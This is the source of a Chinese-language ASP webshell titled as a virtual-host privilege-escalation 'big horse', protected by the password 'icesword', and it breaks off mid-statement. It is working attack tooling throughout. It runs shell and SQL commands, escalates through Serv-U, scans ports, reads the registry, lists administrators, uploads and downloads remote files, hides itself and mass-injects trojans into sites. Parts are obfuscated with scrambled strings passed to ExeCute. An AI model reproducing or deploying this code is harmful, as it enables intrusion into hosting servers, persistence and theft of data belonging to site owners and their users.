<%
UserPass="icesword"'	密码
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
'------------------------内部测试 版----------------------
mmname   ="虚拟机主机提权大马" 'shell标题
mmshell ="六翼炽天使" 'shell版权
errout ="不是你的马,不要骑" '密码错误提示
serversoft=Request.ServerVariables("server_software")
'-------------------------------------------

response.write ""+vbCrLf+""+vbCrLf+""

Response.Buffer = True
Server.ScriptTimeOut=999999999
  
CONST_FSO="Script"&"ing.Fil"&"eSyst"&"emObject"


'把路径加入 \ 
function GetFullPath(path)
	GetFullPath = path
	if Right(path,1) <> "\" then GetFullPath = path&"\" '如果字符最后不是 \ 的就加上
end function

'删除文件
Function Deltextfile(filepath)
 On Error Resume Next
 Set objFSO = CreateObject(CONST_FSO) 
  if objFSO.FileExists(filepath) then '检查文件是否存在 
   objFSO.DeleteFile(filepath) 
  end if 
 Set objFSO = nothing
 Deltextfile = Err.Number '返回错误码 
End Function 


'检测目录是否可写 0 为可读写 1为可写不可以删除
Function CheckDirIsOKWrite(DirStr)
	On Error Resume Next
	Set FSO = Server.CreateObject(CONST_FSO)
	filepath = GetFullPath(DirStr)&fso.GettempName
	FSO.CreateTextFile(filepath) 
	CheckDirIsOKWrite = Err.Number '返回错误码 
	if  ShowNoWriteDir and (CheckDirIsOKWrite =70) then
		Response.Write "[<font color=#0066FF>目录</font>]"&DirStr&" [<font color=red>"&Err.Description&"</font>]<br>"
	end if
	set fout =Nothing
	set FSO = Nothing
	Deltextfile(filepath) '删除掉
	if CheckDirIsOKWrite=0 and Deltextfile(filepath)=70 then CheckDirIsOKWrite =1
end Function

'检测文件是否可以修改(此方法是修改属性,可能会有点不准，但基本能用)
function CheckFileWrite(filepath)
	On Error Resume Next
	Set FSO = Server.CreateObject(CONST_FSO)	
	set getAtt=FSO.GetFile(filepath)
	getAtt.Attributes = getAtt.Attributes
  CheckFileWrite = Err.Number 
	set FSO = Nothing
	set getAtt = Nothing  
end function

'检测目录的可读写性
function ShowDirWrite_Dir_File(Path,CheckFile,CheckNextDir)
	On Error Resume Next
	Set FSO = Server.CreateObject(CONST_FSO)
	B = FSO.FolderExists(Path)
	set FSO=nothing
	
  '是否为临时目录和是否要检测
  IS_TEMP_DIR =	(instr(UCase(Path),"WINDOWS\TEMP")>0) and NoCheckTemp
  		
	if B=false then '如果不是目录就进行文件检测
	'==========================================================================
		Re = CheckFileWrite(Path) '检测是否可写
		if Re =0 then
			Response.Write "[文件]<font color=red>"&Path&"</font><br>"
			b =true
			exit function
		else
			Response.Write "[<font color=red>文件</font>]"&Path&" [<font color=red>"&Err.Description&"</font>]<br>"						
			exit function
		end if	
	'==========================================================================	
	end if
	

	
	Path = GetFullPath(Path) '加 \	
	
	re = CheckDirIsOKWrite(Path) '当前目录也检测一下
	if (re =0) or (re=1) then
		Response.Write "[目录]<font color=#0000FF>"& Path&"</font><br>"
	end if

Set FSO = Server.CreateObject(CONST_FSO)
set f = fso.getfolder(Path)



if (CheckFile=True) and (IS_TEMP_DIR=false) then
b=false
'======================================
for each file in f.Files
	Re = CheckFileWrite(Path&file.name) '检测是否可写
	if Re =0 then
		Response.Write "[文件]<font color=red>"& Path&file.name&"</font><br>"
		b =true
	else
		if ShowNoWriteDir then Response.Write "[<font color=red>文件</font>]"&Path&file.name&" [<font color=red>"&Err.Description&"</font>]<br>"			
	end if
next
if b then response.Flush '如果有内容就刷新客户端显示
'======================================
end if



'============= 目录检测 ================
for each file in f.SubFolders
if CheckNextDir=false then '是否检测下一个目录
	re = CheckDirIsOKWrite(Path&file.name)
	if (re =0) or (re=1) then
		Response.Write "[目录]<font color=#0066FF>"& Path&file.name&"</font><br>"
	end if
end if
	
	if (CheckNextDir=True) and (IS_TEMP_DIR=false) then '是否检测下一个目录
			ShowDirWrite_Dir_File Path&file.name,CheckFile,CheckNextDir '再检测下一个目录
	end if
next
'======================================
Set FSO = Nothing
set f = Nothing
end function

Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:
ExeCute "sub ShowErr():If Err Then:RRS""<br><a href='javascript:history.back()'><br>&nbsp;"" & Err.Description & ""</a><br>"":Err.Clear:Response.Flush:End If:end sub"
Sub RRS(str):response.write(str):End Sub
Function RePath(S)
RePath=Replace(S,"\","\\")
End Function
Function RRePath(S):RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action"):Pos=2
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
Serveru=request.servervariables("http_host")&url
FolderPath=Request("FolderPath"):
Pn=pos*44:FName=Request("FName"):pso=5:BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mmname&" - "&ServerIP&"--Soft - "&serversoft&"</title>"
RRS ""&copyurl&""
rrS"<style type=""text/css"">"
rrs"body,td,center,label{font-size: 12px;background-color:#383838; color:#00ff00;SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #008000; SCROLLBAR-SHADOW-COLOR: #008000; SCROLLBAR-3DLIGHT-COLOR: #00FF00; SCROLLBAR-ARROW-COLOR: #000000; SCROLLBAR-TRACK-COLOR: #000000; FONT-FAMILY: verdana; SCROLLBAR-DARKSHADOW-COLOR: #000000}"
rrs"input,select,textarea{BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 12px; BORDER-LEFT-COLOR: #008000; BACKGROUND: #383838; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #008000; COLOR: #00ff00; BORDER-TOP-COLOR: #008000; FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #008000}"
rrs"hr{color:#00ff00}"
rrs".C{background-color:#000;border:0px}"
rrs".cmd{background-color:#000;color:#FFF}"
rrs"body{margin: 0px;margin-left:4px;}"
rrs"BODY{color:#383838}"
rrs"a{color:#008000;text-decoration: none;}a:hover{color:#00ff00;background:#000}"
rrs".am{color:#888;font-size:12px;}"
rrs"</style>"
rRs"</style>"
ExeCute SinfoEn("lError=kilnerrodow.o;}win trueeturns(){rError killctiont>funscrip=javaguaget lanscripRRS~<rs;~`lse;}rn fa retu;else trueeturn~~))r此操作吗？确认要执行rm(~~confi{if (sok()on yeunctiRRS~f~`();}~ubmitorm.saddrf;top.oldere = F.valurPathFoldeform..addr){topolderder(FowFolon ShunctiRRS~f`~~;}} = ~~valueName.orm.Fhidef{top.}elseit();.submeformp.hidon;toFActiue = n.valActioform..hide){top=nullName!}if(Der~~;~~Othme = e{DNa;}elsDNameue = e.val.FNameformp.hide);to,FNam存在！~~意文件是否全名称,注Mdb文件入要压缩的(~~请输rompte = p{DNamdb~~)pactM~~Comion==(FActse ife;}el DNamlue =me.vam.FNadeforop.hime);t~,FNa能同名！~称,注意不b文件全名新建的Md~请输入要mpt(~= proName ~~){DteMdb~Creaon==~FActie if(;}elsDNameue = e.val.FNameformp.hide);to,FNam全名称~~建的文件夹请输入要新pt(~~ promame =~){DNlder~NewFon==~~Actio if(F}elseName;|~~+D~~|||e += .valuFNameform..hide);topFName名称~~,标文件夹全入移动到目(~~请输rompte = p{DNamer~~)eFold~~Movion==(FActse ife;}el+DNam|||~~= ~~|lue +me.vam.FNadeforop.hime);t~,FNa夹全名称~到目标文件请输入移动pt(~~ promame =~){DNlder~opyFo==~~Cctionif(FAelse ame;}~~+DN~|||| += ~valueName.orm.Fhidef;top.Name)称~~,F标文件全名入移动到目(~~请输rompte = p{DNamle~~)oveFi==~~Mctionif(FAelse ame;}~~+DN~|||| += ~valueName.orm.Fhidef;top.Name)称~~,F标文件全名入复制到目(~~请输rompte = p{DNamle~~)opyFi==~~Cctionif(FAName;e = F.valuFNameform..hide){topctionme,FAm(FNallForon FuunctiRRS~f~",Pso)
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请先连接数据库"");FullDbStr(0);return false;}return true;}":RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节X"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句5</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}":RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请检查SQL语句是否正确!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
RRS"function gotoURL(targ,selObj,restore){if(selObj.options[selObj.selectedIndex].js==1){eval(selObj.options[selObj.selectedIndex].value);if (restore) selObj.selectedIndex=0}else{eval(targ+"".location='""+selObj.options[selObj.selectedIndex].value+""'"");if (restore) selObj.selectedIndex=0;}}</script>"
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">"
Dim Sot(13,2):Sot(0,0) = "Scripting.FileSystemObject":Sot(0,2) = "文件操作组件":Sot(1,0) = "wscript.shell":Sot(1,2) = "命令行执行组件":Sot(2,0) = "ADOX.Catalog":Sot(2,2) = "ACCESS建库组件":Sot(3,0) = "JRO.JetEngine":Sot(3,2) = "ACCESS压缩组件":Sot(4,0) = "Scripting.Dictionary":Sot(4,2) = "数据流上传辅助组件":Sot(5,0) = "Adodb.connection":Sot(5,2) = "数据库连接组件":Sot(6,0) = "Adodb.Stream":Sot(6,2) = "数据流上传组件":Sot(7,0) = "SoftArtisans.FileUp":Sot(7,2) = "SA-FileUp 文件上传组件":Sot(8,0) = "LyfUpload.UploadFile":Sot(8,2) = "刘云峰文件上传组件":Sot(9,0) = "Persits.Upload.1":Sot(9,2) = "ASPUpload 文件上传组件":Sot(10,0) = "JMail.SmtpMail":Sot(10,2) = "JMail 邮件收发组件":Sot(11,0) = "CDONTS.NewMail":Sot(11,2) = "虚拟SMTP发信组件":Sot(12,0) = "SmtpMail.SmtpMail.1":Sot(12,2) = "SmtpMail发信组件":Sot(13,0) = "Microsoft.XMLHTTP":Sot(13,2) = "数据传输组件"
For i=0 To 13
Set T=Server.CreateObject(Sot(i,0))
If -2147221005 <> Err Then
IsObj=" √"
Else
IsObj=" ×"
Err.Clear
End If
Set T=Nothing
Sot(i,1)=IsObj
Next




If FolderPath<>"" then
Session("FolderPath")=RRePath(FolderPath)
End If:If Session("FolderPath")="" Then
FolderPath=RootPath
Session("FolderPath")=FolderPath
End if
Function MainForm() 
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<tr>X→<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>2E→<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>n#→<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\`开始e菜单\\程序\\"")'>程序</a>ib→<a href='javascript:ShowFolder(""c:\\Documents and Settings\\All Users\\a开始p菜单\\程序\\启动"")'>启动</a>ib→<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>LM→<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>Dv→<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Media Index\\"")'><font color=red>~星外常写~</font></a>:”→<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>IJ→<a href='javascript:ShowFolder(""c:\\PHP"")'>PHP</a>ED→<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>WP→<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>eF<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>m?<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>v,<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>常写</a>7"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='40' align='left'>地址：</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='70' align='center'><input name='Submit' type='submit' value='GOGO'>" 
RRS"</td></tr></form></table>"
RRS"<table width='100%' height='96%' style='border:1px solid #008000;' cellpadding='0' cellspacing='0'>"
RRS"<td width='135' id=tl>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td width=1 style='background:#008000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>隐藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>显示</b></a></p></td><td width=1 style='background:#008000'><td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='0'></iframe>"
End Function:Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td><hr hight=1 width='100%'>"
RRS"</td></tr>"
If soT(0,1)=" ×" Then
RRS"<tr><td height='24'>无权限</td></tr>"
Else
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"<tr><td height='20'> <a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>→站点目录</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>→程序目录</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>→上级目录</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>→新建目录</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>→新建文本</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=downloads' target='FileFrame'>→远程下载</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>→上传文件</a><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ScanDriveForm' target='FileFrame'>→可写目录</font></a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=att' target='FileFrame'>→修改权限</font></a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=hiddenshell' target='FileFrame'>→隐藏大马</a><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=fuzhutq1' target='FileFrame'><font color=red>→星外主机提权辅助</a></font><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=fuzhutq2' target='FileFrame'><font color=red>→华众主机提权辅助</a></font><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=fuzhutq3' target='FileFrame'><font color=red>→N点主机提权辅助</a></font><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=fuzhutq4' target='FileFrame'><font color=red>→新网主机提权辅助</a></font><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=fuzhutq5' target='FileFrame'><font color=red>→扫目录可写啊D版</a></font><hr></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Course' target='FileFrame'>→用户账号</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=adminab' target='FileFrame'>→查管理员</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=getTerminalInfo' target='FileFrame'>→自动登录</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ServerInfo' target='FileFrame'>→组件支持</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cmd1Shell' target='FileFrame'>→执行CMD命令</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cmd2' target='FileFrame'>→Cmd2</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=MMD' target='FileFrame'>→SQL执行CMD</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ScanPort' target='FileFrame'>→端口扫描</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Servu' target='FileFrame'>→Serv-u提权</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=suftp' target='FileFrame'>→Serv-u Ftp版</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Servu7x' target='FileFrame'>→Serv-u7x提权</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=ReadREG' target='FileFrame'>→读注册表</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=aspx' target='FileFrame'>→ASPX探测</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=php' target='FileFrame'>→PHP探测</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=jsp' target='FileFrame'>→JSP探测</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cplgm&M=1' target='FileFrame'>→高级挂马</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Cplgm&M=2' target='FileFrame'>→批量清马</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=3' target='FileFrame'>→批量替换</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=DbManager' target='FileFrame'>→数据库操作</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=PageAddToMdb' target='FileFrame'>→打包解包</a></td></tr>"
RRS"<tr><td height='21'><a href='?Action=Logout' target='_top'>→退出登录</a></td></tr>"
End if
RRS"</table></table>"
End Function:
Sub ScanDriveForm() 
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
Response.Write "<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#fff>"
Response.Write "  <TR>"
Response.Write "    <TD colspan=5 >磁盘/系统文件夹信息</TD>"
Response.Write "  </TR>"


  For Each DriveB in FSO.Drives

Response.Write "  </TR>"
Next
Response.Write "  <TR>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(0)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>Windows文件夹</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(0)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(1)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>System32文件夹</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(1)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(2)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>系统临时文件夹</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(2)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "</TABLE><BR>"
Response.Write "<DIV align=center>"
Response.Write "<b>当前网站绝对路径:"&Server.MapPath("/")&"</b>"
Response.Write "  <FORM Action="
Response.Write "?Action=ScFolder method=Post>指定文件夹查询："
Response.Write "    <INPUT type=text name=Folder>"
Response.Write "	<INPUT type=submit value=生成报告>W指定文件夹路径b如：F:\ASP\"
Response.Write "  </FORM>"
Response.Write "<DIV>"
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive) 
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scripting.FileSystemObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(GetTheSize(TestDrive.TotalSize)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))

			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
			Dim TempFolderList,t
			t=0
			Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
		Message Drive & ":磁盘信息",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
    On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
	End if
	Scmsg = Scmsg & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
	Set FSO = Nothing
	Message "文件夹信息",Scmsg,1
End Sub

Function ScReWr(folder):
 On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scripting.FileSystemObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写q</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写q</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & "<FONT color=#ff2222> 可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写Y</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写Y</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function

Sub Message(state,msg,flag)
Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#fff>"
Response.Write "  <TR>"
Response.Write "    <TD >系统信息</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD align=middle bgcolor=#ecfccd>"
Response.Write "	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
Response.Write "	    <TR>"
Response.Write "		  <TD><FONT color=red>"
Response.Write state
Response.Write "</FONT></TD>"
Response.Write "		<TR>"
Response.Write "		  <TD><P>"
Response.Write msg
Response.Write "</P></TD>"
Response.Write "		</TR>"
Response.Write "	  </TABLE>"
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBEnd>"
Response.Write "	"
If flag=0 Then
Response.Write "	      <INPUT type=button value=关闭 onclick=""window.close();"">"
Response.Write "	"
Else
Response.Write "	      <INPUT type=button value=返回 onClick=""history.go(-1);"">"
Response.Write "	"
End if
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "</TABLE>"
End Sub
Function Red(str):Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function
Sub PageAddToMdb():ExeCute SinfoEn("atePth, cteAthm Dih`~)cteAth(~stueeq R =cteAth`~)thPahe~tt(esquRe= h atePth`0000=1uteOimtTipcr.SerrvSe0`he Tb~MdTodd~a= t Ache tIfn`thPahe(tdboMdTad)`UrckBa~&v>di</成!作完>操br><erntcen=igalv di~<S RRl`nd.EseonspRe`Ifd En`he Tb~MdomFrseeael~r= t Ache tIfn`thPahe(tckPaun)`UrckBa~&v>di</成!作完>操br><erntcen=igalv di~<S RRl`nd.EseonspRe`Ifd En`包:夹打文件r><bS~RR~`t>os=podthmem or<fS~RR~`0>=8zesi~ ~~& ) ~)~.h(atpPMar.veer(SdecoEnmlHt& ~ ~~e=luvah atePthe=am nutnp<iS~RR~`t>Ache=tmenab MdTodd=aueal venddhie=yp tutnp<iS~RR~`n>iopt/oO<FS>无pp=aueal vontiop><ontiop</SO>Fso=fueal vontiop><odthMehe=tmenat ecel<sS~RR~`>~ctlese</S~RR`>~包'始打'开e=luvat miub=spetyt puin <S~RR`下~目录同级木马SH于H,位文件db.mSH成H包生 打注:r><br><bS~RR`>~rmfo</S~RR`/>br:<持)O支FS(需解开件包>文r/<hS~RR~`t>os=podthmem or<fS~RR~`0>=8zesi~ b~mdH.HS~\& ) ~)~.h(atpPMar.veer(SdecoEnmlHt& ~ ~~e=luvah atePthe=am nutnp<iS~RR~`'>开包'解e=luvat miub=spetyt puin><cteAthe=am ndbmMroeFasleree=luvan deid=hpetyt puin <S~RR~`录下级目马同H木HS位于件都有文的所开来 解注:r><br><bS~RR~`>~rmfo</S~RR",Pos):End Sub


Sub addToMdb(thePath):ExeCute SinfoEn("xtNee umes Rorrr EOn`lotaCado ar,Stnnco, amrest, nnco, rsm Dig`t~SerdcoReB.ODAD(~ctjeObteeaCrr.veer S =rst Se)`~)amreStB.ODAD(~ctjeObteeaCrr.veer S =amrestt Se`~)ontiecnnCoB.ODAD(~ctjeObteeaCrr.veer S =nncot Se`~)ogalat.COXAD(~ctjeObteeaCrr.veer S =ogalatoCadt Se`~)db.mSH~Hh(atpPMar.veer S &=~ceurSoa at D0;4.B.EDOLt.Jet.ofoscrMir=deviro~P= r Stnnco`Stnncoe atre.CogalatoCadr`Stnncon pe.Onncor`)~gema IntteoneCil fr,harCVah atePth, EDERSTLU CEY KRYMARI P1)0,Y(ITNTDE Int iIda(ateDil Fleab TteeaCr(~tecuxe.Ennco)`pe.Oamrestn`= e yp.Tamrest1` 33,, nnco, a~ateDil~Fn pe.Ors`enTh~ so~f= ) d~hoeteMth(~stueeq RIf`eatr ss, rh,atePthb MdoreFreoTfsm`ls Ee`amrest, rs, thPahe tdbrMFoeeTrsa`Ifd En`selo.Crs`selo.CnnCo`selo.Camrest`nghiot N =rst Se`nghiot N =nncot Se`nghiot N =amrestt Se`nghiot N =ogalatoCadt Se",Pos):End Sub:
Function fsoTreeForMdb(thePath, rs, stream):ExeCute SinfoEn("FileL, sysfilesers,  foldlder,theFotem, Dim iist`SH.ldmdb$H$HSH.t = ~leLissysFib$~`se Th= Falath) (thePxistslderE~).FobjectstemOileSying.Fcriptct(~SeObjeCreatrver.If Seen`访问!~)或者不允许目录不存在 & ~ ePathrr(thshowE`End If`(thePolder.GetFect~)emObjeSystg.Filiptin(~ScrbjecteateOer.Cr Servder =heFolSet tath)`r.FilFolde= theiles Set fes`ubFolder.SheFols = tolderSet fders`n foltem Iach iFor Eders`treamrs, sath, tem.PMdb ieeForfsoTr`Next`n filtem Iach iFor Ees`<= 0 ~$~) me & em.Na & it, ~$~eListysFilStr(sIf InThen`rs.AddNew`Path,item. Mid(h~) =hePatrs(~t 4)`Path)item.File(dFromm.Loastrea`m.Reastrea~) = ntentileCors(~fd()`rs.Update`End If`Next`= Notiles Set fhing`othins = NolderSet fg` Nothder =heFolSet ting",Pso):End Function:Sub unPack(thePath):ExeCute SinfoEn("xtNee 